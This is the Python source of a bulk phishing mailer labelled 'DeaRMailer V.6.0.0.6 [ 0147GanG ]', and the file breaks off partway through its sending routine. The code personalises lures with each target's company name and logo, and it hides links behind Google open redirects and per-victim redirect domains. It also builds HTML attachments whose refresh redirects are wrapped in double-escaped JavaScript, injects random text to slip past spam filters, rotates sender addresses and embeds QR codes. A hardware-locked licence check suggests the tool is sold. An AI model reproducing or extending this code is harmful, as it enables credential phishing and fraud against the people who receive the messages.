
#!/usr/bin/env python -W ignore::DeprecationWarning
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 
try:
    from html2image import Html2Image
    import requests,urllib
    import urllib.request
    from datetime import timedelta, date,datetime
    import sys 
    import colorama
    from colorama import Fore, Back, Style
    import json
    from email.mime.text import MIMEText
    from email.header import Header
    from email.mime.base import MIMEBase
    from base64 import encodebytes
    from os.path import basename
    import smtplib
    import queue
    import threading
    import os,codecs,string,re,time,ssl,json
    from email.mime.multipart import MIMEMultipart
    import random,string,base64
    from random import randrange, uniform
    from random import *
    import random
    from email.mime.image import MIMEImage
    from configparser import ConfigParser
    import configparser
    from email.utils import formataddr
    from dns import resolver
    from platform import system as system_name
    import uuid
    from urllib.parse import urlparse
    import urllib.parse
    import dns
    import socket
    from tld import get_tld
    from urllib.request import urlopen
except ImportError as e:
    #e = e[0][16:]
    print(f"Please install {e.args[0].rsplit(' ',1)[-1]} :importation failed...")
    exit(1)
import os

# Global variable for reply-to email address
reply_to = ''

if system_name().lower()=="windows":
  colorama.init(autoreset=True)
  def prRed(): return Fore.RED
  def prGreen(): return Fore.GREEN
  def prYellow(): return Fore.YELLOW
  def prBlack(): return Fore.BLACK

  def BRed(): return Back.RED
  def BGreen(): return Back.GREEN
  def BYellow(): return Back.YELLOW
  def BBlack(): return Fore.BLACK


  def prPurple(prt): print(prt)
  def prCyan(prt): print(prt)
  def prLightGray(prt): print(prt)
  def prBlack(prt): print(prt) 
else:
  def prRed(prt): return("\033[91m{}\033[00m" .format(prt))
  def prGreen(prt): return("\033[92m{}\033[00m" .format(prt))
  def prYellow(prt): return("\033[93m{}\033[00m" .format(prt))
  def prLightPurple(prt): return("\033[94m{}\033[00m" .format(prt))
  def prPurple(prt): return("\033[95m{}\033[00m" .format(prt))
  def prCyan(prt): return("\033[96m{}\033[00m" .format(prt))
  def prLightGray(prt): return("\033[97m{}\033[00m" .format(prt))
  def prBlack(prt): return("\033[98m{}\033[00m" .format(prt))

if system_name().lower()=="windows":
    os.system("title"+" DeaRMailer V.6.0.0.6 [ 0147GanG ]")

def bin2hex(binn):
    import string
    sonuc = binn.encode('hex')
    return sonuc

def hex2bin(h):
  return codecs.decode(h,"hex")

def get_hardware_uuid():
        try:
            def get_hardware_serial():
                return io_key("IOPlatformSerialNumber")

            def get_board_id():
                return io_key("board-id").bytes().tobytes().decode("utf-8").rstrip("\x00")

            def io_key(keyname):
                return IORegistryEntryCreateCFProperty(IOServiceGetMatchingService(0, IOServiceMatching("IOPlatformExpertDevice".encode("utf-8"))), NSString.stringWithString_(keyname), None, 0)

            if system_name().lower()=="darwin":
                    import objc
                    from Foundation import NSBundle, NSString
                    IOKit_bundle = NSBundle.bundleWithIdentifier_('com.apple.framework.IOKit')

                    functions = [("IOServiceGetMatchingService", b"II@"),
                                 ("IOServiceMatching", b"@*"),
                                 ("IORegistryEntryCreateCFProperty", b"@I@@I"),
                                ]

                    objc.loadBundleFunctions(IOKit_bundle, globals(), functions)
                    return io_key("IOPlatformUUID")
            elif system_name().lower()=="windows":
                    return get_windows_uuid()
            else:
                    return str(GetNainIP())
        except Exception as e:
            print(e)

def GetNainIP():
    from requests import get
    ip = get('https://api.ipify.org').text
    return str(ip)

def get_windows_uuid():
    try:
        ip = str(uuid.uuid1())
        ip = "".join(ip.split('-', 2)[-1])
        n_ip,ip = ip.split('-', 1)
        ip = ip.split('-', 1)[-1]
        ip = ip+n_ip
        return ip
    except:
        pass 

    return str(GetNainIP())

def checkkeycode(key,window):
    try:
        if key == "":
            windowerror(window,"Token Cant be empty")
            return False
        key_file = "0DM"+key+".key"
        found = True if os.path.exists(key_file) else False
        if found:
            with open(key_file) as my_file:
                my_file.seek(0)
                first_char = my_file.read(1)
                if not first_char:
                    return False
                else:
                    my_file.seek(0)
                    content = my_file.read()
                    content = str(hex2bin(content),'utf-8')
                    new_key,ipplus = content.split('@', 1)
                    new_key = str(hex2bin(new_key),'utf-8')
                    ip,exptime = ipplus.split(':', 1)
                    ip = str(hex2bin(ip),'utf-8')
                    exptime = str(hex2bin(exptime),'utf-8')
                    new_ip = str(get_hardware_uuid())
                    is_key = True if ((new_key == key)) else False
                    is_ip = True if ((ip == get_hardware_uuid())) else False
                    if is_key:
                        if is_ip:
                            if its_date(exptime,window):
                                return True
                            else:
                                return False
                        else:
                            windowerror(window,key+ " Registered to another user.")
                            return False
                    else:
                        windowerror(window,key, "Invalid KEY :"+ key)
                        return False
        else:
            windowerror(window,"Invalid KEY : "+key)
            return False
    except Exception as e:
        windowerror(window, e)
        return False

def its_date(date):
    try:
        import datetime
        import dateutil.parser
        from datetime import datetime
        now = datetime.now()
        #current_time = now.strftime("%Y-%m-%d %H:%M:%S")
        current_time = now.strftime("%Y-%m-%d")
        #print("Current Time =", current_time)
        insertion_date = dateutil.parser.parse(date)
        #print("Given Time =", str(insertion_date))
        if str(current_time) < str(insertion_date):
            #print "Date Still Valid"
            return True
        else:
            #print "Date Expired"
            return False
    except ImportError as e:
        e = ("Please install "+e.args[0].rsplit(' ',1)[-1])
        print(e)
    except Exception as e:
        print(e)
        return False

def DemonHtml(filename):
    contentdata = codecs.open(filename,'r','utf8').read()
    attdata = auto_code_html(contentdata)
    if os.path.isfile(filename):
        os.remove(filename)
    f = open(filename, "w+")
    f.write(attdata)
    f.close()
    return filename

def MakeHtml(email,filename,attch):
    try:
        contentdata = codecs.open(attch,'r','utf8').read()
        attdata = findString(email,contentdata)
        filename = findString(email,filename)
        directory = "ATT"
        if not os.path.exists(directory):
            os.makedirs(directory)
        tempfile  = "ATT/"+filename
        if os.path.isfile(tempfile):
            os.remove(tempfile)
        f = open(tempfile, "w+")
        f.write(attdata)
        f.close()
        return tempfile
    except Exception as e:
        print(str(e))

def MakeHtmlLink(email,filename,contentdata):
    try:
        #contentdata = codecs.open(attch,'r','utf8').read()
        attdata = findString(email,contentdata)
        filename = findString(email,filename)
        directory = "ATT"
        if not os.path.exists(directory):
            os.makedirs(directory)
        tempfile  = "ATT/"+filename
        if os.path.isfile(tempfile):
            os.remove(tempfile)
        f = open(tempfile, "w+")
        f.write(attdata)
        f.close()
        return tempfile
    except Exception as e:
        print(str(e))

def auto_code(link):
    tt = '<script language = "javascript" > document.write(unescape(\'<meta http-equiv="refresh" content="1;url='+link+'">\')); </script>'
    te = ''.join(["\\u%04x" % (ord(c)) for c in tt])
    nt = '<script type="text/javascript">document.write(unescape(\''+te+'\'))</script>'
    return nt

def auto_code_html(text):
    ts = ''.join(["\\u%04x" % (ord(c)) for c in text])
    tt = '<script language = "javascript" > document.write(unescape(\''+ts+'\')); </script>'
    te = ''.join(["\\u%04x" % (ord(c)) for c in tt])
    nt = '<script type="text/javascript">document.write(unescape(\''+te+'\'))</script>'
    return nt

def obfuscate_content(content):
    """
    Obfuscates content by injecting random invisible text and comments.
    """
    try:
        # Generate random text block
        random_text_block = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(50, 200)))
        
        # Generate random comments
        random_comment = "<!-- " + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(10, 30))) + " -->"
        
        # Replace placeholders if they exist
        content = content.replace('{random_text_block}', random_text_block)
        content = content.replace('{random_comment}', random_comment)
        
        return content
    except Exception as e:
        print(f"Error obfuscating content: {e}")
        return content

def findString(email,xstring):
    username = email.split('@')[0]
    mename = username.capitalize()
    domain = email.split('@')[1]
    domain_name = domain.split('.')[0].capitalize()
    domain_type = domain.split('.')[1]
    comapnyname = ''
    if mename[0:3] :
        mename3 = mename[0:3]
    else:
        mename3 = mename

    
    try:
        response = urlopen('https://autocomplete.clearbit.com/v1/companies/suggest?query='+domain)
        string = response.read().decode('utf-8')
        json_obj = json.loads(string)
        comapnyname = json_obj[0]['name']
    except Exception as e:
        errr = e
    else:
        pass


    if not comapnyname:
        comapnyname = domain_name
    
    xstring = xstring.replace("{email}", email)
    xstring = xstring.replace("{year}", time.strftime("%Y"))
    xstring = xstring.replace("[year]", time.strftime("%Y"))
    xstring = xstring.replace("{equal}", "=")
    xstring = xstring.replace("{random}", Random())
    xstring = xstring.replace("[random]", Random(10))
    xstring = xstring.replace("{number}",RandomNumber())
    xstring = xstring.replace("[number]", RandomNumber(10))
    xstring = xstring.replace("{mename}", mename)
    xstring = xstring.replace("{mename3}", mename3.upper())
    xstring = xstring.replace("{frmsite}", domain_name)

    xstring = xstring.replace("[frmsite]", domain_name)
    xstring = xstring.replace("{domain}", domain)
    xstring = xstring.replace("{comapnyname}", comapnyname)
    xstring = xstring.replace("{companyname}", comapnyname)
    xstring = xstring.replace("{base64email}", base64encode(email))
    xstring = xstring.replace("[base64email]", base64encode(email))
    xstring = xstring.replace("{hexemail}", str2hex(email))
    xstring = xstring.replace("{time}", time.strftime("%H:%M:%S %p"))
    xstring = xstring.replace("[sec]", time.strftime("%S"))
    xstring = xstring.replace("{sec}", time.strftime("%S"))
    xstring = xstring.replace("{secs}", Random(8))
    xstring = xstring.replace("{date}", time.strftime("%d %B, %Y"))
    xstring = xstring.replace("{dayoftheweek}", time.strftime("%A"))
    xstring = xstring.replace("{monthoftheyear}", time.strftime("%B"))
    xstring = xstring.replace("[Time_own_format]", time.strftime("%d %B, %Y") + time.strftime("%H:%M:%S %p"))
    
    # Handle QR code URLs - replace with placeholder that will be processed later
    # Pattern: {qrcode:URL} or detect quickchart.io/qr URLs
    qr_regex = r'https?://(?:www\.)?(?:quickchart\.io|api\.qrserver\.com)/qr[^\s"\'<>]*'
    qr_matches = re.findall(qr_regex, xstring, re.IGNORECASE)
    for qr_url in qr_matches:
        # Generate placeholder that will be processed in Sendout
        qr_placeholder = f"{{QRCODE_URL:{qr_url}}}"
        xstring = xstring.replace(qr_url, qr_placeholder)

    numregex = '{number(.*)}'
    pattern = r'{number(?:.|\n)*?}'

    textregex = '{random(.*)}'
    textpattern = r'{random(?:.|\n)*?}'

    cmdbaseregex = 'base64{(.*?)}'
    cmdbasepattern = r'base64{(?:.*?)}'

    #link_band = 'linkbind{(.*?)}'
    #link_band_pattern = 'linkbind{(?:.*?)}'

    dateeregex = '{date(.*?)}'
    datepattern = r'{date(?:.|\n)*?}'

    numresult = re.findall(pattern, xstring, flags=re.DOTALL)

    textresult = re.findall(textpattern, xstring, flags=re.DOTALL)

    cmdbaseresult = re.findall(cmdbasepattern, xstring, flags=re.DOTALL)

    link_band = 'linkbind{(.*?)}'
    link_band_pattern = 'linkbind{(?:.*?)}'
    link_bandresult = re.findall(link_band_pattern, xstring, flags=re.DOTALL)

    for found in numresult:
        #print(found)
        nr = re.search(numregex, found).group(1)
        xstring = xstring.replace(str(found), RandomNumber(nr))

    for tfound in textresult:
        tr = re.search(textregex, tfound).group(1)
        xstring = xstring.replace(str(tfound), Random(tr))

    for datefound in re.findall(datepattern, xstring, flags=re.DOTALL):
        dr = re.search(dateeregex, datefound).group(1)
        #date_1 = datetime.datetime.strptime(start_date, "%d %B, %Y")
        xstring = xstring.replace(str(datefound), (datetime.now() + timedelta(days=int(dr)) ).strftime('%d %B, %Y'))

    urlencoderegex = r'urlencode(\(.*?)\)'
    urlencodepattern = r'urlencode\((?:.*?)\)'
    urlencodresult = re.findall(urlencodepattern, xstring, flags=re.DOTALL)

    for urlencodfound in urlencodresult:
            #print(str(cmdbfound))
            cr = re.search(r'\((.*?)\)', urlencodfound).group(1)
            #print(cr)
            xstring = xstring.replace(str(urlencodfound),urllib.parse.quote_plus(cr.encode('utf-8')))
            #print(xstring)

    for cmdbfound in cmdbaseresult:
        #print(str(cmdbfound))
        cr = re.search('{(.*?)}', cmdbfound).group(1)
        #print(cr)
        xstring = xstring.replace(str(cmdbfound), base64encode(str(cr)))

    for linkfound in link_bandresult:
        lr = re.search('{(.*?)}', linkfound).group(1)
        URL_target,URL_link_taget = lr.split(",")
        poison_url_code = MakeRequest(URL_target, URL_link_taget);
        date = datetime.now().strftime("%Y%m%d%H%M%S");
        reply_text = URL_target + "?service=mediafile&UID=" + Random(10) + "&iTeamID=" + poison_url_code + "&media_file_id=" + Random(21) + "&date=" + date;
        xstring = xstring.replace(str(linkfound), reply_text)
        

    return str(xstring)



def itsurl(link):
    regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, link) is not None # True 
    ###return false

def GoogleUrl(link, GoogleApi=None):
  """
  Generate a Google-based redirect URL for link tracking
  Uses legitimate Google redirect services
  Falls back to direct link if unavailable
  """
  try:
    # URL encode the link
    encoded_link = urllib.parse.quote(link, safe='')
    
    # Method 1: Use Google's official URL redirect service
    # This creates a redirect through Google's infrastructure
    google_redirect = f"https://www.google.com/url?q={encoded_link}&rct=j"
    
    # Method 2: Try Google's linkredirect (alternative method)
    # This may provide better tracking
    try:
        # Google's redirect through their URL builder
        alt_redirect = f"https://www.google.com/url?q={encoded_link}"
        return alt_redirect
    except:
        return google_redirect
        
  except Exception as err:
    # Return original link if Google redirect fails
    return link

def MakeRequest(url, target_url):
    try:
        payload = {"dm_store_url":target_url}
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        response = requests.post(url, data=payload, headers=headers)

        pastebin_url = response.text
        return pastebin_url
    except:
        return "Oops!", sys.exc_info()[0], "occurred."

def Random(number=15):
    try:
        min_char = int(number)
        max_char = int(number)
    except ValueError:
        min_char = 15
        max_char = 15
    allchar = string.ascii_letters + string.digits
    rara = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
    return rara

def RandomNumber(number=15):
    try:
        min_char = int(number)
        max_char = int(number)
    except ValueError:
        min_char = 15
        max_char = 15
    allchar = string.digits
    rara = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
    return rara

def base64encode(data):
    if val_url(data):
        #print(data)
        encodedBytes = base64.urlsafe_b64encode(data.encode("utf-8"))
        encodedBytes = str(encodedBytes, "utf-8")
        #print(encodedBytes)
        return(encodedBytes)
    else:
        encodedBytes = base64.urlsafe_b64encode(data.encode("utf-8"))
        encodedStr = str(encodedBytes, "utf-8")
        return(encodedStr)

def base64encodeURL(data):
    encodedBytes = base64.urlsafe_b64encode(data.encode("utf-8"))
    encodedBytes = str(encodedBytes, "utf-8")
    return encodedBytes

def baseNewe(message):
    import base64
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    return base64_message

def val_url(url):
    regex = re.compile(
            r'^((http?|ftp)://|(www|ftp)\.)[a-z0-9-]+(\.[a-z0-9-]+)+([/?].*)?$', re.IGNORECASE)
    #p = re.compile('^(([^:/?#]+):)?(//([^/?#]*))?([^?#]*)(\?([^#]*))?(#(.*))?')
    #m = p.match(url)
    result = re.match(regex, url)
    if result:
        #print(result)
        return True

def Googlelink(link):
    link = urllib.parse.quote(link)
    link = "https://hangouts.google.com/linkredirect?dest="+link
    return link

def redirect403(email,domain403,url):
    u = urlparse(domain403)
    scheme = u.scheme
    domain = u.netloc
    onlyurl = scheme+'://'+str(Random(5))+'.'+domain+'/'+base64encode(email)+'#'+base64encode(url)
    return onlyurl

def str2hex(s):
    return s.encode("utf-8").hex()

def get_qr_code_as_cid(qr_url, email):
    """
    Download QR code from URL and save it, returning CID reference
    Returns the CID reference to use in HTML like cid:qr_xxxxx.png
    """
    try:
        # Ensure LOGO_PICS directory exists
        if not os.path.exists('LOGO_PICS'):
            os.makedirs('LOGO_PICS')
        
        # Generate unique filename based on email and URL
        qr_hash = str(abs(hash(qr_url + email)))[:12]
        qr_filename = f"qr_{qr_hash}.png"
        qr_path = "LOGO_PICS/" + qr_filename
        
        # Download QR code if not already cached
        if not os.path.exists(qr_path):
            response = requests.get(qr_url, timeout=10)
            if response.status_code == 200:
                with open(qr_path, 'wb') as f:
                    f.write(response.content)
            else:
                return None
        
        return qr_filename  # Return just filename for CID reference
    except Exception as e:
        print(f"Warning: Could not download QR code: {e}")
        return None

def blowimgsrc(string):
    regex = r"""<ima?ge?(?=\s|>)(?=(?:[^>=]|='[^']*'|="[^"]*"|=[^'"][^\s>]*)*?\ssrc=(['"]?)(.*?)\1(?:\s|>))(?:[^>=]|='[^']*'|="[^"]*"|=[^'"][^\s>]*)*>""";

    intCount = 0
    imgs = []
    imgurl = []
    for matchObj in re.finditer( regex, string, re.M|re.I|re.S):
        imgsrc = os.path.basename(matchObj.group(2))
        
        

            #print("CID image ('%s')"%(imgsrc))
        imgs.append(imgsrc)
        imgurl.append(matchObj.group(2))
        #print " "
        #print "[", intCount, "][ 0 ] : ", matchObj.group(0)
        #print "[", intCount, "][ 1 ] : ", matchObj.group(1)
        #print "[", intCount, "][ 2 ] : ", matchObj.group(2)
        #print(os.path.basename(matchObj.group(2)))
        #print (os.path.split(matchObj.group(2))[-1])
        intCount+=1
    #ans = arr.array(imgs,imgurl)
    #return imgs
    return imgurl

def load_rotating_headers():
    headers_list = []
    try:
        if os.path.exists('headers.txt'):
            with open('headers.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        try:
                            # Try parsing as JSON first
                            header_dict = json.loads(line)
                            headers_list.append(header_dict)
                        except json.JSONDecodeError:
                            pass # Skip invalid lines
    except Exception as e:
        print(f"Error loading headers: {e}")
    return headers_list

def sort_leads(text,words,typec):
    text = text.lower()
    words = words.lower()

    def ignore(value):
        #global words
        #IGNList = selfconfig.get('OPTION', 'IGNList')
        lst = list(words.split(' '))
        for i in lst:
            if i in value:
                return False
        return True

    def include(value):
        #global words
        #IGNList = selfconfig.get('OPTION', 'IGNList')
        lst = list(words.split(' '))
        for i in lst:
            if i in value:
                return True
        return False

    rx = re.compile(r'\S+@\S+')
    if str(typec).lower() == "exclude":
        inputs = filter(ignore, rx.findall(text))
    elif str(typec).lower() == "include":
        inputs = filter(include, rx.findall(text))
    return inputs

def checkDomain( domain ):
    try:
        # Go with the first answer from the name server.
        # Future enhancement: determine which is primary MX
        # and go with that one.
        answers = dns.resolver.query(domain, 'MX')
        return str(answers[0]).split()[1] # python rocks right here.
    
    except:
        return False

def checkMXResolve( mx ):
    try:
        answers = dns.resolver.query(mx, 'A')
        return str(answers[0])

    except:
        return False

def is_valid_email(email):
    email = email.lower()
    regex = r"\A(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)\Z"
    if(re.search(regex,email)):
        domain = email.rstrip().split('@')[1]
        mx = checkDomain(domain)
        if( False == mx ):
            return False
        else:
            return True

def check(email):
    regex = r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)"
    if(re.search(regex,email)):
        return True
        #print("Valid Email")   
    else:
        return False
        #print("Invalid Email")

def log_success(email, message=""):
    """Log successful email to success.txt"""
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S %p")
        with open('success.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {email}")
            if message:
                f.write(f" - {message}")
            f.write("\n")
    except Exception as e:
        pass  # Silently fail if logging fails

def log_failed(email, error_message=""):
    """Log failed email to failed.txt"""
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S %p")
        with open('failed.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {email}")
            if error_message:
                f.write(f" - {error_message}")
            f.write("\n")
    except Exception as e:
        pass  # Silently fail if logging fails

def BindLink(email,link):
    global useRedirect,domain403,UseGoogle
    link = findString(email,link)
    idn = int(useRedirect)
    
    if idn == 0:
        # Direct link - no redirect
        selflink = link
    elif idn == 1:
        # Google redirect - use UseGoogle setting
        if UseGoogle:
            # Use Google's official URL redirect service
            selflink = GoogleUrl(link)
        else:
            # Use simple Google Hangouts redirect
            selflink = Googlelink(link)
    elif idn == 2:
        # Custom 403 domain redirect
        selflink = redirect403(email,domain403,link)
    else:
        # Default to direct link
        selflink = link
    
    return selflink

def ConnectSMTP(smtpserv,port,useauth,user,password,receivers,sender,usessl,msginfo):
    try:
        port = int(port)
    except ValueError:
        raise Exception(f"Invalid SMTP port: '{port}'. Please check your configuration (smtp.txt or setup.ini).")
    socket.setdefaulttimeout(2 * 60)
    context = ssl.create_default_context()

    if len(sender) == 0:
        sender = user

    try:
        if port == 465 and usessl:
            with smtplib.SMTP_SSL(smtpserv, port, context) as server:
                server.ehlo()
                #server.starttls()
                server.login(user, password)
                #return server
                server.sendmail(sender, receivers, msginfo)
                #print('mail successfully sent')
                return True
        else:
            with smtplib.SMTP(smtpserv, port) as server:
                server.ehlo()
                if usessl:
                    server.starttls()
                if useauth:
                    server.login(user, password)
                    time.sleep(int(secs))
                #return server
                server.sendmail(sender, receivers, msginfo)
                #print('mail successfully sent')
                server.quit()
                return True
    except Exception as e:
        raise Exception('Error: {}'.format(e))
        return False
        #print(e)

def GetFromEmail(str):
    x_dict = str.split (",")
    return random.choice(list(x_dict))

def Screnshot(email):
    imagename = Random(50)+'.png'
    saveimagename = 'LOGO_PICS/'+imagename
    savehtmlname = 'ATT/'+email+Random(5)+'.html'
    try:
        texttoprint =  codecs.open('print.html','r','utf8').read()
        texttoprint = findString(email,texttoprint)
        hti = Html2Image(custom_flags=['--no-sandbox', '--hide-scrollbars'])
        hti.browser_executable = "/usr/bin/google-chrome"
        hti.output_path = 'LOGO_PICS'
        html = texttoprint
        css = "body {background: white;}"
        hti.screenshot(html_str=html, css_str=css,  save_as=imagename, size=(520, 700))
        if os.path.isfile(savehtmlname):
            os.remove(savehtmlname)
        return str(saveimagename)
    except Exception as e:
        print(str(e))  

def GetBanner(email,URL):
    """
    Fetch company favicon based on email domain using Google Favicon API
    Returns path to favicon image file
    """
    try:
        # Ensure LOGO_PICS directory exists
        if not os.path.exists('LOGO_PICS'):
            os.makedirs('LOGO_PICS')
        
        # Extract domain from email
        domain = email.split('@')[1]
        
        # Generate filename based on domain
        domain_name = domain.split('.')[0].capitalize()
        filename = f"{domain_name}.png"  # Google returns PNG favicons
        logo_path = f"LOGO_PICS/{filename}"
        
        # Download favicon if it doesn't exist
        if not os.path.exists(logo_path):
            try:
                # Use Google favicon service
                imgurl = f"https://www.google.com/s2/favicons?domain={domain}&sz=128"
                
                # Use requests with proper headers
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                }
                
                response = requests.get(imgurl, headers=headers, timeout=10, allow_redirects=True)
                
                # Check if we got a valid image response (status 200 and content-type is image)
                if response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '')
                    if 'image' in content_type:
                        # Save the image
                        with open(logo_path, 'wb') as f:
                            f.write(response.content)
                        
                        # Verify file was saved and has content
                        if not (os.path.exists(logo_path) and os.path.getsize(logo_path) > 0):
                            logo_path = None
                    else:
                        # Got a non-image response (likely 404 or error page)
                        logo_path = None
                else:
                    # HTTP error
                    logo_path = None
                        
            except Exception as download_error:
                # Silently fail if download fails
                logo_path = None
        
        # Verify file exists and has content
        if logo_path and os.path.exists(logo_path) and os.path.getsize(logo_path) > 0:
            return logo_path
        else:
            return None
            
    except Exception as e:
        # Return None if favicon cannot be fetched
        return None

def Sendout(emails,smtpserv,port,its_authy,username,password,fromemail,sender,its_secure):
    global texto,subject,name,sfile,link,msgtype
    if '{mx}' in smtpserv:
        mxRecord = ''
        try:
            answers = dns.resolver.query(emails.split("@",1)[1], 'MX')
        except:
            mxRecord = "some error"
        else:
            mxRecord = answers[0].exchange.to_text()
        finally:
            smtpserv = mxRecord
            #print(smtpserv)
    sender = findString(emails,sender)
    fromemail = GetFromEmail(fromemail)
    nlink = BindLink(emails,link)
    nmsg = findString(emails,texto)
    
    # Apply stealth obfuscation
    nmsg = obfuscate_content(nmsg)
    
    nmsg = nmsg.replace("{link}", nlink)
    src_imgs = []

    # Ensure LOGO_PICS directory exists
    if not os.path.exists('LOGO_PICS'):
        os.makedirs('LOGO_PICS')
    
    # Process {logo} placeholder - fetch company logo based on email domain
    if '{logo}' in nmsg or '{{logo}}' in nmsg:
        try:
            logo_path = GetBanner(emails, link)
            if logo_path and os.path.exists(logo_path):
                logo_filename = os.path.basename(logo_path)
                # Replace {logo} in img src attributes with CID reference
                # Handles: src="{logo}", src='{logo}', src={logo}
                nmsg = re.sub(
                    r'(<img[^>]*src=["\']?)\{logo\}(["\']?[^>]*>)',
                    r'\1cid:' + logo_filename + r'\2',
                    nmsg,
                    flags=re.IGNORECASE
                )
                # Replace {logo} in background-image or other CSS
                nmsg = re.sub(
                    r'(background-image\s*:\s*url\(["\']?)\{logo\}(["\']?\))',
                    r'\1cid:' + logo_filename + r'\2',
                    nmsg,
                    flags=re.IGNORECASE
                )
                # Replace standalone {logo} placeholder (not in tags)
                nmsg = re.sub(
                    r'(?<!cid:)(?<!["\'])\{logo\}(?!["\'])',
                    f"cid:{logo_filename}",
                    nmsg,
                    flags=re.IGNORECASE
                )
                # Also handle {{logo}} (double braces)
                nmsg = nmsg.replace('{{logo}}', f"cid:{logo_filename}")
                # Add to src_imgs so it gets attached
                if logo_path not in src_imgs:
                    src_imgs.append(logo_path)
            else:
                # Logo not found - remove placeholder to avoid broken images
                print(f"Warning: Could not fetch logo for {emails} - removing {{logo}} placeholder")
                nmsg = nmsg.replace('{logo}', '')
                nmsg = nmsg.replace('{{logo}}', '')
        except Exception as e:
            print(f"Warning: Could not process logo placeholder: {e}")
            # Remove {logo} placeholder if logo can't be fetched
            nmsg = nmsg.replace('{logo}', '')
            nmsg = nmsg.replace('{{logo}}', '')
    
    # Process QR code URL placeholders {QRCODE_URL:...}
    qr_placeholder_pattern = r'\{QRCODE_URL:(https?://[^\}]+)\}'
    qr_placeholders = re.findall(qr_placeholder_pattern, nmsg)
    for qr_url in qr_placeholders:
        qr_filename = get_qr_code_as_cid(qr_url, emails)
        if qr_filename:
            placeholder = f"{{QRCODE_URL:{qr_url}}}"
            # Replace placeholder with CID reference in img tags
            nmsg = re.sub(
                r'(<img[^>]*src=["\']?)' + re.escape(placeholder) + r'(["\']?[^>]*>)',
                r'\1cid:' + qr_filename + r'\2',
                nmsg,
                flags=re.IGNORECASE
            )
            # Also replace if placeholder is standalone or in other contexts
            nmsg = nmsg.replace(placeholder, f"cid:{qr_filename}")
            # Add to src_imgs so it gets attached
            if os.path.exists(f"LOGO_PICS/{qr_filename}"):
                src_imgs.append(f"LOGO_PICS/{qr_filename}")

    ##nmsg = nmsg.replace('{image}', GetBanner(emails,link))
    
    imgs = blowimgsrc(nmsg)
    for img in imgs:
        # Handle base64 data URIs (data:image/png;base64,...)
        if img.lower().startswith('data:'):
            try:
                # Parse data URI: data:image/png;base64,<base64data>
                header, data = img.split(',', 1)
                # Extract image type from header (e.g., image/png)
                if 'image/' in header:
                    img_type = header.split('image/')[1].split(';')[0]
                else:
                    img_type = 'png'  # Default to PNG
                
                # Decode base64 data
                img_data = base64.b64decode(data)
                
                # Generate filename for the image
                img_hash = str(abs(hash(img)))[:12]
                img_filename = f"qr_{img_hash}.{img_type}"
                
                # Ensure LOGO_PICS directory exists
                if not os.path.exists('LOGO_PICS'):
                    os.makedirs('LOGO_PICS')
                
                # Save decoded image to file
                img_path = "LOGO_PICS/"+img_filename
                with open(img_path, 'wb') as f:
                    f.write(img_data)
                
                # Replace data URI with CID reference
                nmsg = nmsg.replace(img, "cid:"+img_filename)
                src_imgs.append(img_path)
            except Exception as e:
                print(f"Warning: Could not process base64 image: {e}")
                continue
            continue
        
        if img.lower().startswith('cid:'):
            img_src = str(img.lower().split(":", 1)[-1])
            #nmsg = nmsg.replace(img, "cid:"+os.path.basename(img_src))
            #src_imgs.append(img_src)
            #print(img_src)

            if img_src.lower().startswith('http'):
                # Extract proper filename from URL, handling query parameters
                try:
                    parsed_url = urllib.parse.urlparse(img_src)
                    url_filename = os.path.basename(parsed_url.path)
                    if not url_filename or '.' not in url_filename:
                        # Generate a filename from URL hash if no proper extension
                        url_hash = str(abs(hash(img_src)))[:12]
                        url_filename = f"img_{url_hash}.png"
                    # Ensure LOGO_PICS directory exists
                    if not os.path.exists('LOGO_PICS'):
                        os.makedirs('LOGO_PICS')
                    img_src_path = "LOGO_PICS/"+url_filename
                    if not os.path.isfile(img_src_path):
                        urllib.request.urlretrieve(img_src, img_src_path)
                    img_src = img_src_path
                    img_filename = os.path.basename(img_src)
                    nmsg = nmsg.replace(img, "cid:"+img_filename)
                    src_imgs.append(img_src)
                except Exception as e:
                    # If image download fails, skip it
                    print(f"Warning: Could not download image {img_src}: {e}")
                    continue
            elif img_src.lower().startswith('{image}') or img_src.lower().startswith('{print}'):
                if img_src.lower().startswith('{image}'):
                    img_src = GetBanner(emails,link)
                    img_filename = os.path.basename(img_src)
                elif img_src.lower().startswith('{print}'):
                    img_src = Screnshot(emails)
                    img_filename = os.path.basename(img_src)
                img_src_path = "LOGO_PICS/"+img_filename
                img_src = img_src_path
                nmsg = nmsg.replace(img, "cid:"+img_filename)
                src_imgs.append(img_src)
            else:
                # For CID images (like cid:qr.png), check in LOGO_PICS directory first
                img_filename = os.path.basename(img_src)
                # Skip if filename is empty or just dots
                if not img_filename or img_filename in ['.', '..', '...']:
                    continue
                # Try LOGO_PICS directory first
                logo_pics_path = "LOGO_PICS/"+img_filename
                if os.path.exists(logo_pics_path):
